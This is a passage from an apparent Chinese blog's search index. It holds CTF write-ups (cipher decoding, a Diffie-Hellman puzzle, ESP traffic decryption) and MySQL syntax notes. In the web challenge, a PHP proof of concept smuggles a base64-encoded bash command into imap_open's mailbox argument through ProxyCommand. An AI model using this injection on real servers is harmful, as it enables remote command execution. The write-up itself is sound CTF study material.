class=\"string\">'_'</span>,<span class=\"string\">';'</span>,<span class=\"string\">'q'</span>,<span class=\"string\">'j'</span>,<span class=\"string\">'k'</span>,<span class=\"string\">'x'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'m'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">'v'</span>,<span class=\"string\">'z'</span>,<span class=\"string\">'&#123;'</span>,<span class=\"string\">'&#125;'</span>]</span><br><span class=\"line\">dic = dict(zip(QWERTY,Dvorak))</span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">s = <span class=\"string\">'ypau_kjg;\"g;\"ypau+'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">    flag += dic[i]</span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>flag{this_is_flag}</p>\n</blockquote>\n<h3 id=\"get-it\"><a href=\"#get-it\" class=\"headerlink\" title=\"get it\"></a>get it</h3><blockquote>\n<p>Alice和Bob正在进行通信，作为中间人的Eve一直在窃听他们两人的通信。</p>\n<p>Eve窃听到这样一段内容，主要内容如下：<br>p = 37<br>A = 17<br>B = 31</p>\n<p>U2FsdGVkX1+mrbv3nUfzAjMY1kzM5P7ok/TzFCTFGs7ivutKLBLGbZxOfFebNdb2<br>l7V38e7I2ywU+BW/2dOTWIWnubAzhMN+jzlqbX6dD1rmGEd21sEAp40IQXmN/Y0O<br>K4nCu4xEuJsNsTJZhk50NaPTDk7J7J+wBsScdV0fIfe23pRg58qzdVljCOzosb62<br>7oPwxidBEPuxs4WYehm+15zjw2cw03qeOyaXnH/yeqytKUxKqe2L5fytlr6FybZw<br>HkYlPZ7JarNOIhO2OP3n53OZ1zFhwzTvjf7MVPsTAnZYc+OF2tqJS5mgWkWXnPal<br>+A2lWQgmVxCsjl1DLkQiWy+bFY3W/X59QZ1GEQFY1xqUFA4xCPkUgB+G6AC8DTpK<br>ix5+Grt91ie09Ye/SgBliKdt5BdPZplp0oJWdS8Iy0bqfF7voKX3VgTwRaCENgXl<br>VwhPEOslBJRh6Pk0cA0kUzyOQ+xFh82YTrNBX6xtucMhfoenc2XDCLp+qGVW9Kj6<br>m5lSYiFFd0E=</p>\n<p>分析得知，他们是在公共信道上交换加密密钥，共同建立共享密钥。</p>\n<p>而上面这段密文是Alice和Bob使用自己的密值和共享秘钥，组成一串字符的md5值的前16位字符作为密码使用另外一种加密算法加密明文得到的。</p>\n<p>例如Alice的密值为3，Bob的密值为6，共享秘钥为35，那么密码为：</p>\n<p>password = hashlib.md5(“(3,6,35)”).hexdigest()[0:16]</p>\n</blockquote>\n<h1 id=\"二月月赛\"><a href=\"#二月月赛\" class=\"headerlink\" title=\"二月月赛\"></a>二月月赛</h1><h2 id=\"WEB-1\"><a href=\"#WEB-1\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><p>注册登录，有个邮箱验证功能，验证之后新增一个改变背景的功能，允许图片上传，但是只允许上传jpg图片，查看源代码可以看到图片的存储位置<br><img src=\"https://i.loli.net/2019/02/28/5c778a7acd48e.png\" alt><br>上传测试可以发现文件会被强制命名为<code>用户名.jpg</code>，截断什么的也不存在，当时就是做到这里没思路了，看了飘零学长的思路之后，知道了imap_open思路，该函数原型为</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">imap_open(string $mailbox, string $username, string $password [, int $options = <span class=\"number\">0</span> [, int $n_retries = <span class=\"number\">0</span> [, <span class=\"keyword\">array</span> $params = <span class=\"keyword\">NULL</span> ]]] ) : resource</span><br></pre></td></tr></table></figure>\n<p>漏洞在于$mailbox，用docker来测试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker search imap</span><br><span class=\"line\">docker pull fedosov&#x2F;docker-php-imap-composer</span><br><span class=\"line\">docker run -itd fedosov&#x2F;docker-php-imap-composer &#x2F;bin&#x2F;bash</span><br><span class=\"line\">docker attach id</span><br></pre></td></tr></table></figure>\n<p>写入一个实现漏洞测试函数<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$payload = <span class=\"string\">\"echo skysky|tee /tmp/success\"</span>;</span><br><span class=\"line\">$encoded_payload = base64_encode($payload);</span><br><span class=\"line\">$server = <span class=\"string\">\"any -o ProxyCommand=echo\\t\"</span>.$encoded_payload.<span class=\"string\">\"|base64\\t-d|bash\"</span>;</span><br><span class=\"line\">@imap_open(<span class=\"string\">'&#123;'</span>.$server.<span class=\"string\">'&#125;:143/imap&#125;INBOX'</span>, <span class=\"string\">''</span>, <span class=\"string\">''</span>);</span><br></pre></td></tr></table></figure></p>\n<p>在执行之前/tmp目录为空，运行该文件之后生成了success文件，据此我们可以通过邮箱验证功能向/user目录中写入文件，</p>\n<p>但是实际操作失败了，不知道原因为何。</p>\n<h2 id=\"MISC-4\"><a href=\"#MISC-4\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"非常简单的流量分析\"><a href=\"#非常简单的流量分析\" class=\"headerlink\" title=\"非常简单的流量分析\"></a>非常简单的流量分析</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http contains &quot;robots.txt&quot;</span><br></pre></td></tr></table></figure>\n<p>追踪http流可以看到存在abc.html页面，接续追踪该流量，查看abc.html页面内容</p>\n<blockquote>\n<p>md5 0x99a98e067af6b09e64f3740767096c96</p>\n<p>DES 0xb19b21e80c685bcb052988c11b987802d2f2808b2c2d8a0d  (129-&gt;143)</p>\n<p>DES 0x684a0857b767672d52e161aa70f6bdd07c0264876559cb8b  (143-&gt;129)</p>\n</blockquote>\n<p>当时做到这里僵住了，没有考虑后面的ESP流量包，看wp可知ESP是通过IpSec协议加密过的流量，需要解密流量包</p>\n<p>按照配置网上的思路配置一下esp秘钥，依次选择<code>编辑-&gt;首选项-&gt;Protocols-&gt;ESP</code></p>\n<p>添加配置信息，协议选择ipv4，源IP和目的IP填好，SPI在数据包里面有，Encrypt选择TripleDES-CBC，选择对应的des秘钥， authentication选择MD5，选择上面MD5值<br><img src=\"https://i.loli.net/2019/02/28/5c7779afb7a07.png\" alt></p>\n<p>之后即可得到解密报文</p>\n<p>发现http报文有点特殊</p>\n<p><img src=\"https://i.loli.net/2019/02/28/5c7779ee0e7c4.png\" alt></p>\n<p>可以看到前几位是flag的ascii码值，将此种类型数据包提取出来处理一下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'2.txt'</span>,<span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    content = f.read()</span><br><span class=\"line\">    flag = <span class=\"string\">''</span></span><br><span class=\"line\">    par = re.findall(<span class=\"string\">r'include/information/.*_(.*)\\.php'</span>,content)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> par:</span><br><span class=\"line\">        flag += chr(int(i))</span><br><span class=\"line\">    print(flag)</span><br></pre></td></tr></table></figure>\n<p>flag：<code>flag{27b03b758f255276e5a98da0e1947bed}</code></p>\n","categories":["复现"],"tags":["CTF"]},{"title":"MySQL学习笔记(二)","url":"/2018/01/07/mysql2/","content":"<p>Mysql数据库的增删查改<br><a id=\"more\"></a></p>\n<h3 id=\"MYSQL基本命令\"><a href=\"#MYSQL基本命令\" class=\"headerlink\" title=\"MYSQL基本命令\"></a>MYSQL基本命令</h3><div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>命令</th>\n<th>解释</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>show variables like ‘char%’;</td>\n<td>显示系统中带有char字符的系统参数</td>\n<td></td>\n</tr>\n<tr>\n<td>set character_set_client gbk;</td>\n<td>设置客户端编码方式为GBK</td>\n<td></td>\n</tr>\n<tr>\n<td>status;</td>\n<td>显示当前系统信息</td>\n<td></td>\n</tr>\n<tr>\n<td>delimiter $$</td>\n<td>修改命令结束符号为$$</td>\n<td>想要恢复；作为结束符使用 opdelimiter ;</td>\n</tr>\n</tbody>\n</table>\n</div>\n<hr>\n<h3 id=\"数据库语句\"><a href=\"#数据库语句\" class=\"headerlink\" title=\"数据库语句\"></a>数据库语句</h3><p><strong>创建数据库</strong></p>\n<h2 id><a href=\"#\" class=\"headerlink\" title></a><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">create [database|schema] [if not existe] databasename</span><br><span class=\"line\">[options ...]</span><br></pre></td></tr></table></figure></h2><p><strong>修改数据库</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER [DATABASE|SCHEMA] [DATABASENAME]</span><br><span class=\"line\">\tOPTION ...</span><br></pre></td></tr></table></figure><br>此命令用于修改数据库的全局特性，这些特性存在db.opt文件中，如果语句中忽略数据库名，则会修改当前数据库<br>示例代码<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">alter database xscj</span><br><span class=\"line\">default charcter set gb2312;</span><br></pre></td></tr></table></figure></p>\n<p><strong>删除数据库</strong><br>DROP DATABASE DATABASENAME</p>\n<hr>\n<h3 id=\"表结构操作语句\"><a href=\"#表结构操作语句\" class=\"headerlink\" title=\"表结构操作语句\"></a>表结构操作语句</h3><h4 id=\"创建表\"><a href=\"#创建表\" class=\"headerlink\" title=\"创建表\"></a>创建表</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">create [temporary] table [if not exists] user(</span><br><span class=\"line\">\tid int auto_increment not null primary key,</span><br><span class=\"line\">\tusername varchar(10) not null</span><br><span class=\"line\">);  # 使用ifnot...从句可以不显示错误信息</span><br><span class=\"line\">\t# unique key也可以表示字段名唯一</span><br></pre></td></tr></table></figure>\n<h4 id=\"插入语句\"><a href=\"#插入语句\" class=\"headerlink\" title=\"插入语句\"></a>插入语句</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">insert into tablename values(1,&#39;Tom&#39;)  # 字符串串值需要用引号括起来</span><br></pre></td></tr></table></figure>\n<h4 id=\"复制现成的表\"><a href=\"#复制现成的表\" class=\"headerlink\" title=\"复制现成的表\"></a>复制现成的表</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">CREATE TABLE TABLE_NAME LIKE HAVED_TABLE; # 该命令会复制一个与已有表结构相同的空表</span><br><span class=\"line\">CREATE TABLE TABLE_NAME AS (表达式ex：select * from haved_table); </span><br><span class=\"line\">\t# 该命令是复制表达内容，但是表达式和索引不会复制，只会复制内容部分，例如主键特性就不会被复制</span><br></pre></td></tr></table></figure>\n<h4 id=\"修改表\"><a href=\"#修改表\" class=\"headerlink\" title=\"修改表\"></a>修改表</h4><h5 id=\"修改表结构\"><a href=\"#修改表结构\" class=\"headerlink\" title=\"修改表结构\"></a>修改表结构</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ALTER [IGNORE] TABLE table_name</span><br><span class=\"line\">\toption ...</span><br><span class=\"line\">OPTIOIN:</span><br><span class=\"line\">ADD [COLUMN] 列定义 [FIRST|AFTER 列名]\t\t\t&#x2F;*添加列*&#x2F;</span><br><span class=\"line\">ALTER [COLUMN] 列名 &#123;SET DEFAULT literal|DROP DEAFAULT&#125;\t\t\t&#x2F;*修改默认值*&#x2F;</span><br><span class=\"line\">CHANGE [COLUMN] 列名 愿列名 [FIRST|AFTER 列名]\t\t\t\t&#x2F;*列名重定义*&#x2F;</span><br><span class=\"line\">MODIFY [COLUMN] 列定义 [FIRST|AFTER 列名]\t\t\t&#x2F;*修改列数据类型*&#x2F;</span><br><span class=\"line\">DROP [COLUMN] 列名 \t\t\t\t&#x2F;*删除列*&#x2F;</span><br><span class=\"line\">RANAME [TO] 列表名\t\t\t\t&#x2F;*重命名该表*&#x2F;</span><br><span class=\"line\">ORDER BY 列名 \t\t\t\t\t&#x2F;*排序*&#x2F;</span><br><span class=\"line\">CONVERT TO CHARACTER SET 字符集名 [COLLATE 校对规则名] \t\t&#x2F;*将字符集转换为二进制*&#x2F;</span><br><span class=\"line\">[DEFAULT] CHARACTER SET 字符集名 [COLLATE 校对规则名]\t\t\t&#x2F;*修改默认字符集*&#x2F;</span><br></pre></td></tr></table></figure>\n<p><strong>示例代码</strong><br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.alter <span class=\"keyword\">table</span> xs <span class=\"keyword\">add</span> <span class=\"keyword\">column</span> 性别 <span class=\"built_in\">bit</span> <span class=\"keyword\">not</span> <span class=\"literal\">null</span> <span class=\"keyword\">after</span> 姓名;      \t<span class=\"comment\"># 注意列名不加引号，加了会报错</span></span><br><span class=\"line\">2.alter <span class=\"keyword\">table</span> xs <span class=\"keyword\">change</span> 备注 <span class=\"keyword\">backup</span> <span class=\"built_in\">char</span>(<span class=\"number\">10</span>);\t\t\t\t\t<span class=\"comment\"># 修改列名，先给出原列名，注意后面必须要加新列名的数据类型</span></span><br><span class=\"line\">3.alter <span class=\"keyword\">table</span> xs <span class=\"keyword\">modify</span> <span class=\"keyword\">backup</span> <span class=\"built_in\">char</span>(<span class=\"number\">11</span>);\t\t\t\t\t\t<span class=\"comment\"># 修改列的数据类型，但是如果新的数据类型与所存的数据类型冲突则会错误</span></span><br></pre></td></tr></table></figure><br>对于多条命令可以用，号隔开<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">alter table xs</span><br><span class=\"line\">\tadd 年级 tinyint,</span><br><span class=\"line\">\tdrop column 姓名;</span><br></pre></td></tr></table></figure></p>\n<h5 id=\"更改表名\"><a href=\"#更改表名\" class=\"headerlink\" title=\"更改表名\"></a>更改表名</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">RENAME TABLE 老表名 TO 新表名\t\t\t\t\t\t\t\t\t\t&#x2F;*多个命令之间用逗号隔开*&#x2F;</span><br></pre></td></tr></table></figure>\n<h4 id=\"删除表\"><a href=\"#删除表\" class=\"headerlink\" title=\"删除表\"></a>删除表</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DROP [TEMPORARY] TABLE [IF EXISTS] 表名</span><br></pre></td></tr></table></figure>\n<h4 id=\"表结构特点\"><a href=\"#表结构特点\" class=\"headerlink\" title=\"表结构特点\"></a>表结构特点</h4><p>1.表达空值与数值数据0或者空字符混为一谈，任意两个空值都不相等<br>2.长度小于4的varchar被改变为char<br>3.隐含的改变列类型</p>\n<hr>\n<h3 id=\"表记录操作\"><a href=\"#表记录操作\" class=\"headerlink\" title=\"表记录操作\"></a>表记录操作</h3><h4 id=\"插入记录\"><a href=\"#插入记录\" class=\"headerlink\" title=\"插入记录\"></a>插入记录</h4><p>4.1 插入新纪录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] &#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125;  # low,delayed等表示该操作的优先级</span><br><span class=\"line\">\t[INTO] 表名 [(列名,...)]</span><br><span class=\"line\">\tVALUES(&#123;expr|default&#125;,...),(,...),...</span><br><span class=\"line\">\t|SET 列名&#x3D;&#123;expr|default&#125;,...</span><br><span class=\"line\">    [ON DUPLICATE KEY UPDATE 列名&#x3D;expr,..] # 该语句作用是如果发生unique key或primary key或primary出现重复，则按照该语句指定的列插入</span><br></pre></td></tr></table></figure>\n<p>4.2 从已有表中插入新记录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSERT [LOW_PRIORITY|DELAYED|HIGH_PRIORITY] &#123;%raw%&#125;[IGNORE]&#123;%endraw%&#125;</span><br><span class=\"line\">\t[INTO] 表名 [(列名,...)]</span><br><span class=\"line\">\tSELECT 语句</span><br><span class=\"line\">\t[ON DUPLICATE KEY UPDATE 列名&#x3D;expr,..]</span><br></pre></td></tr></table></figure>\n<p>4.3 替换旧记录    REPLACE<br>    语句与insert相同，该语句会在插入之前将与新纪录冲突的旧记录删除，从而插入新数据<br>4.4 插入图片可以插入路径或者直接存储图片本身(使用load_file()函数，参数为图片路径)</p>\n<h4 id=\"修改记录\"><a href=\"#修改记录\" class=\"headerlink\" title=\"修改记录\"></a>修改记录</h4><p><strong>4.1 修改单个表</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">UPDATE [LOW_PRIORITY] [IGNORE] 表名</span><br><span class=\"line\">\tSET 列名1&#x3D;expr1[,列名2&#x3D;expr2...]</span><br><span class=\"line\">\t[WHERE 条件]      # 若没有设定，则会更新所有区行</span><br><span class=\"line\">\t[ORDER BY　...]</span><br><span class=\"line\">\t[LIMIT row_count]</span><br></pre></td></tr></table></figure>\n<p><strong>4.2 修改多个表</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">UPDATE [LOW_PRIORITY] [IGNORE] 表名1,表名2,...</span><br><span class=\"line\">\tSET 列名1&#x3D;expr1[,列名2&#x3D;expr2...]</span><br><span class=\"line\">\t[WHERE 条件]</span><br></pre></td></tr></table></figure>\n<h4 id=\"删除记录\"><a href=\"#删除记录\" class=\"headerlink\" title=\"删除记录\"></a>删除记录</h4><h5 id=\"4-1单表操作\"><a href=\"#4-1单表操作\" class=\"headerlink\" title=\"4.1单表操作\"></a>4.1单表操作</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">delete [low_priority] [quick] from 表名     # quick修饰符可以加快部分删除操作的速度</span><br><span class=\"line\">\t[where 条件]</span><br><span class=\"line\">\t[order by ...]</span><br><span class=\"line\">\t[limit row_count]</span><br></pre></td></tr></table></figure>\n<h5 id=\"2-多个表中操作\"><a href=\"#2-多个表中操作\" class=\"headerlink\" title=\"2.多个表中操作\"></a>2.多个表中操作</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">delete [low_priority] [quick] [ignore] 表名[.*][,表名[.*]...]</span><br><span class=\"line\">\tfrom table_references</span><br><span class=\"line\">\t[where ]             该语句删除from子句之前的表中的内容</span><br></pre></td></tr></table></figure>\n<h5 id=\"或者\"><a href=\"#或者\" class=\"headerlink\" title=\"或者\"></a>或者</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">delete [low_priority] [quick] [ignore]  # 该语句删除from子句中的表中的内容</span><br><span class=\"line\">\tfrom 表名[.*][,表名[.*]...]</span><br><span class=\"line\">\tusing table_references</span><br><span class=\"line\">\t[where]</span><br></pre></td></tr></table></figure>\n<h5 id=\"EXAMPE：\"><a href=\"#EXAMPE：\" class=\"headerlink\" title=\"EXAMPE：\"></a>EXAMPE：</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">delete user1,user2</span><br><span class=\"line\">\tfrom user1,user2,user</span><br><span class=\"line\">\twhere user1.id&#x3D;user.id and user2.id&#x3D;user.id</span><br></pre></td></tr></table></figure>\n<h5 id=\"清除表数据\"><a href=\"#清除表数据\" class=\"headerlink\" title=\"清除表数据\"></a>清除表数据</h5><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">truncate table 表名     # 清空表</span><br></pre></td></tr></table></figure>\n<h3 id=\"数据库信息显示\"><a href=\"#数据库信息显示\" class=\"headerlink\" title=\"数据库信息显示\"></a>数据库信息显示</h3><p><img src=\"/2018/01/07/mysql2/1.jpg\" height=\"600\" width=\"495\"></p>\n","categories":["资料"],"tags":["SQL"]},{"title":"MySQL学习笔记(三)","url":"/2018/01/18/mysql3/","content":"<p>Mysql操作表,例如SELECT语句等。<br><a id=\"more\"></a></p>\n<h3 id=\"SELECT语句\"><a href=\"#SELECT语句\" class=\"headerlink\" title=\"SELECT语句\"></a>SELECT语句</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select</span><br><span class=\"line\">\t[all|distinct|distinctrow] # 指定是否重复行应被返回，如不指定默认值为all</span><br><span class=\"line\">\t[high_priority] # 优先级设置</span><br><span class=\"line\">\t[straight_join] # 促使mysql把表联合在一起,加快查询速度</span><br><span class=\"line\">\t[sql_small_result] [sql_big_result] [sql_buffer_result] # 设置结果集的显示</span><br><span class=\"line\">\t[sql_cache|sql_no_cache] [sql_calc_found_rows] # cache指定是否要把结果集存储在查询表缓存中，第三个选项指定结果集的行数，忽略limit</span><br><span class=\"line\">\t列名表达式 ...</span><br><span class=\"line\">\t[from 表或视图 ... [...]]</span><br><span class=\"line\">\t[where 条件]</span><br><span class=\"line\">\t[group by &#123;列名|表达式|position&#125; [asc|desc],... [with rollup]]</span><br><span class=\"line\">\t[having 条件]</span><br><span class=\"line\">\t[order by &#123;列名|表达式|position&#125; [asc|desc],...]</span><br><span class=\"line\">\t[limit &#123;[offset,] row_count|row_count OFFSET offset&#125;]</span><br><span class=\"line\">\t[procedure 存储过程名(参数...)]</span><br><span class=\"line\">\t[into outfile &#39;文件名&#39; [character set 字符集]  # 将表中的行导出到文件中</span><br><span class=\"line\">\texport_options|into dumpfile &#39;文件名&#39;|info 变量名 ...]</span><br><span class=\"line\">\t[for update|lock in share mode]] # 对结果集加锁，for update更推荐</span><br></pre></td></tr></table></figure>\n<hr>\n<h3 id=\"选择列\"><a href=\"#选择列\" class=\"headerlink\" title=\"选择列\"></a>选择列</h3><p><strong>as 指定列别名</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 学号 as number from stu;   # 指定结果集别名</span><br></pre></td></tr></table></figure>\n<p>替换查询结果中的数据<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">case</span><br><span class=\"line\">\twhen 条件1 then 表达式1</span><br><span class=\"line\">\twhen 条件2 then 表达式2</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\telse 表达式n</span><br><span class=\"line\">end</span><br><span class=\"line\">EXP:</span><br><span class=\"line\">\tselect 编号,姓名</span><br><span class=\"line\">\tcase</span><br><span class=\"line\">\t when 编号 is null then &#39;ff&#39;</span><br><span class=\"line\">\t else &#39;ok&#39;</span><br><span class=\"line\">\tend</span><br><span class=\"line\">\tfrom stuinfo;</span><br></pre></td></tr></table></figure><br><strong>计算列值</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 表达式 ...  # 可以进行加减乘除取余%等运算</span><br><span class=\"line\">exp：</span><br><span class=\"line\">select 学号,成绩*1.2 from xs where ID&#x3D;1;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"聚合函数-aggregation-function\"><a href=\"#聚合函数-aggregation-function\" class=\"headerlink\" title=\"聚合函数(aggregation function)\"></a>聚合函数(aggregation function)</h4><p><strong>聚合函数常用于对一组值进行计算，返回单个值，通常与group by子句一起使用,作用于列</strong></p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">函数名</th>\n<th>说明</th>\n<th>语法</th>\n<th>备注</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">count</td>\n<td>求组中系数，返回int类型数据</td>\n<td>count({[all&#124;distinct] 表达式}&#124;*)</td>\n<td>&#42;将返回检索行总数目，包括其值包含null</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">max</td>\n<td>求最大值</td>\n<td>max([all&#124;distinct] 表达式)</td>\n<td>数据类型可以是数字、字符和时间日期类型</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">min</td>\n<td>求最小值</td>\n<td>略</td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">sum</td>\n<td>返回表中所有值的和</td>\n<td>sum/avg([all&#124;distinct] 表达式)</td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">avg</td>\n<td>组中平均值</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">std/stddev</td>\n<td>返回标准差</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">variance</td>\n<td>方差</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">group_concat</td>\n<td>返回由属于一组的列值连接组合而成的结果</td>\n<td>用法略</td>\n<td>该函数返回指定列的所有非NULL值，中间用逗号隔开，长度最大限制1024</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bit_and</td>\n<td>逻辑或</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bit_or</td>\n<td>逻辑与</td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">bit_xor</td>\n<td>逻辑异或</td>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3 id=\"FROM子句\"><a href=\"#FROM子句\" class=\"headerlink\" title=\"FROM子句\"></a>FROM子句</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">from table_reference ...</span><br><span class=\"line\">\ttable_reference:</span><br><span class=\"line\">表名 [[as] 表名别名] [&#123;use|ignore|force&#125; index (key_list)]  &#x2F;*查询表，use指使用索引，ignore指忽略索引*&#x2F;</span><br><span class=\"line\">|join_table                                                &#x2F;*连接表*&#x2F;</span><br></pre></td></tr></table></figure>\n<p><strong>多表连接</strong><br>1)全连接，实质是表的等值连接<br>这种连接会产生所有可能的组合，也就是每个表的行数之积<br>“select 编号,ID from stuinfo,student;”这样会返回两个表行数之积,通常需要用where语句限制结果行数<br>2)JOIN连接<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">join_table:</span><br><span class=\"line\">\ttable_reference [inner|cross] join table_factor [join_condition]</span><br><span class=\"line\">\t|table_reference straight_join table_factor</span><br><span class=\"line\">\t|table_reference straight_join table_factor on conditional_expr</span><br><span class=\"line\">\t|table_reference &#123;LEFT|RIGHT&#125; [outer] join table_reference join_condition</span><br><span class=\"line\">\t|table_reference natural [&#123;LEFT|RIGHT&#125; [outer]] join_table_factor</span><br></pre></td></tr></table></figure><br>table_reference指定要连接的表名<br>join_condition：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">on 条件</span><br><span class=\"line\">|using (列...)</span><br></pre></td></tr></table></figure><br>on条件主要用于连接表，其他不属于连接表的条件可以使用where子句来指定，inner指内连接，是系统默认的方式。<br>exp:<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select 编号,ID from stuinfo join student;</span><br></pre></td></tr></table></figure><br>join还可以将自身进行连接，称为自连接，但是要指定不同的别名</p>\n<h3 id=\"WHERE子句\"><a href=\"#WHERE子句\" class=\"headerlink\" title=\"WHERE子句\"></a>WHERE子句</h3><p>where子句必须紧跟在from子句之后，用于确定选取行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">where 条件</span><br></pre></td></tr></table></figure>\n<p>其中条件为查询语句<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">条件&#x3D;:</span><br><span class=\"line\">\t&lt;precdicate&gt;                             </span><br><span class=\"line\">\t|&lt;precdicate&gt;&#123;and|or&#125;&lt;precdicate&gt;</span><br><span class=\"line\">\t|(条件)</span><br><span class=\"line\">\t|not 条件</span><br></pre></td></tr></table></figure><br>precidicate为判定运算，结果又TRUE，FALSE或UNKNOWN<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;precdicate&gt;:</span><br><span class=\"line\">\t表达式 &#123;&#x3D;|&lt;|&lt;&#x3D;|&gt;&#x3D;|&lt;&#x3D;&gt;|&lt;&gt;|!&#x3D;&#125; 表达式                    # &quot;&lt;&#x3D;&gt;&quot;相等或都等于空返回true，否则返回false，绝不会返回unknown  </span><br><span class=\"line\">\t|表达式 [not] like 表达式 [escape &#39;escape_character&#39;]</span><br><span class=\"line\">\t|表达式 [not] [regexp|rlike] 表达式</span><br><span class=\"line\">\t|表达式 [not] between 表达式 and 表达式</span><br><span class=\"line\">\t|表达式 is [not] null</span><br><span class=\"line\">\t|表达式[not] in (subquery |表达式[,...n])</span><br><span class=\"line\">\t|表达式 &#x3D;|&lt;|&lt;&#x3D;|&gt;&#x3D;|&lt;&#x3D;&gt;|&lt;&gt;|!&#x3D;&#125; &#123;all|some|any&#125; (subquery)</span><br><span class=\"line\">\t|exist (子查询)</span><br></pre></td></tr></table></figure><br><strong>模式匹配</strong></p>\n<h4 id=\"1-like运算符\"><a href=\"#1-like运算符\" class=\"headerlink\" title=\"1)like运算符\"></a>1)like运算符</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">表达式 [not] like 表达式 [escape &#39;escape_character&#39;]</span><br></pre></td></tr></table></figure>\n<p>模式匹配时，可用%和_进行模糊查询，%代表0个或多个字符,符号_代表单个字符<br>escape 转义字符，例如当要匹配的字符串中有_或%时，此时应通过该字符前的转义字符指明其为模式串中的字符，使用escape可以指定转义字符</p>\n<h4 id=\"2-regexp-正则表达式-，是mysql的一个功能。\"><a href=\"#2-regexp-正则表达式-，是mysql的一个功能。\" class=\"headerlink\" title=\"2)regexp(正则表达式)，是mysql的一个功能。　\"></a>2)regexp(正则表达式)，是mysql的一个功能。　</h4><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">match_exp [not][regexp|rlike] match_exp</span><br></pre></td></tr></table></figure>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">特殊字符</th>\n<th 